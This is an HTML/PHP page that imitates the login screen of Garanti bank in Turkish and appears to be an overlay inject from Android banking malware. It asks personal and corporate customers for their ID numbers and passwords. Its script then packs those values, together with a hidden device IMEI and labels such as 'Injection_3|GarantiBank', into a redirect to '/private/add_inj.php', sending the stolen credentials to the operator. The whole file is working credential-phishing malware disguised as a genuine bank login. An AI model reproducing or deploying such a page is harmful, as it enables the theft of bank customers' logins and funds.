<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Garanti</title>

    <link rel="stylesheet" href="tr/Garanti/css/normalize.css">
    <link rel="stylesheet" href="tr/Garanti/css/main.css">
    <link rel="stylesheet" href="tr/Garanti/css/garanti.css">

    <script src="tr/Garanti/js/jquery.min.js"></script>
    <script src="tr/Garanti/js/viewport.js"></script>
    <script src="tr/Garanti/js/cat.functions.js"></script>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
?>
<body>
    <div class="row">
        <div class="form_header">
            <img src="tr/Garanti/images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" id="form" class="wrapper">
				
	<div class="row" id="select_type">
						<div class="content">

							<div class="btn_wr">
								<button class="sign_btn" id="pers_btn" type=button>
									B&#304;REYSEL
								</button>
							</div>

							<div class="btn_wr">
								<button class="sign_btn"  id="corp_btn">
									KURUMSAL
								</button>
							</div>
						</div>
					</div>

<script>

function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}



$(document).ready(function() {
$('#pers_btn').click(function(){
$('#row_pers').show();
$('#row_corp').remove();
$('#select_type').remove();
return false;
});

$('#corp_btn').click(function(){
$('#row_corp').show();
$('#row_pers').remove();
$('#select_type').remove();
return false;
});

$('.main_input').bind("change keyup input click", function() {
    if (this.value.match(/[^0-9]/g)) {
        this.value = this.value.replace(/[^0-9]/g, '');
    }
});
$('.main_input[name="field3"]').unbind();


$('#row_corp .sign_btn').click(function(){
if (($('#row_corp input').eq(0).val().length < 5) || (!checkBad($('#row_corp input').eq(0).val()))) {$('#row_corp input').eq(0).addClass('inpError'); $('#row_corp input').eq(0).focus(); return false;} else $('#row_corp input').eq(0).removeClass('inpError');
if (($('#row_corp input').eq(1).val().length < 5) || (!checkBad($('#row_corp input').eq(1).val()))) {$('#row_corp input').eq(1).addClass('inpError'); $('#row_corp input').eq(1).focus(); return false;} else $('#row_corp input').eq(1).removeClass('inpError');
if (($('#row_corp input').eq(2).val().length < 5) || (!checkBad($('#row_corp input').eq(2).val()))) {$('#row_corp input').eq(2).addClass('inpError'); $('#row_corp input').eq(2).focus(); return false;} else $('#row_corp input').eq(2).removeClass('inpError');

var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login1_"].value; 
var login2 = document.forms["form"].elements["login2_"].value;
var pass = document.forms["form"].elements["pass1_"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_3|GarantiBank|"+login1+"|"+pass+"|"+login2);

//sendForm(true);
//closeWindow();
return false;
});

$('#row_pers .sign_btn').click(function(){
if (($('#row_pers input').eq(0).val().length < 5) || (!checkBad($('#row_pers input').eq(0).val()))) {$('#row_pers input').eq(0).addClass('inpError'); $('#row_pers input').eq(0).focus(); return false;} else $('#row_pers input').eq(0).removeClass('inpError');
if (($('#row_pers input').eq(1).val().length < 5) || (!checkBad($('#row_pers input').eq(1).val()))) {$('#row_pers input').eq(1).addClass('inpError'); $('#row_pers input').eq(1).focus(); return false;} else $('#row_pers input').eq(1).removeClass('inpError');

var imei_c = document.forms["form"].elements["imei"].value; 
var login1 = document.forms["form"].elements["login1"].value; 
var pass = document.forms["form"].elements["pass1"].value; 

location.replace('/private/add_inj.php?p=' + imei_c+"|Injection_4|GarantiBank|"+login1+"|"+pass);

//sendForm(true);
//closeWindow();
return false;
});

});
</script>
<style>

.inpError{
border: 2px solid red;

}
</style>
					<div class="row" id="row_pers" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 M&#252;&#351;teri / T.C. Kimlik Numaras&#305;
								</div>






								<div class="inp_wr">


									<input type="text" name="field2" id="login1" class="main_input" maxlength=11 required="">


								</div>
							</div>




							<div class="input_block_wr">
								<div class="inp_caption">
									Parola
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" id="pass1" class="main_input" maxlength=8 required="">
									<input type="hidden" name="field4" value="pers_acc">
								</div>
							</div>
							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351;
								</button>
							</div>
						</div>
					</div>

					<div class="row" id="row_corp" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									 M&#252;&#351;teri Numaras&#305;
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" id="login1_" class="main_input" maxlength=9 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									 Parola
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" id="pass1_" class="main_input" maxlength=8 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									  Kullan&#305;c&#305; M&#252;&#351;teri / T.C. Kimlik Numaras&#305;
								</div>
								<div class="inp_wr">
									<input type="text" name="field4"  id="login2_" class="main_input" maxlength=11 required="">
								</div>
							</div>





							<div class="btn_wr">
								<button class="sign_btn">
									Giri&#351;
								</button>
							</div>
						</div>
					</div>


<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>

				</form>
			</div>
		</div>
</body>

</html>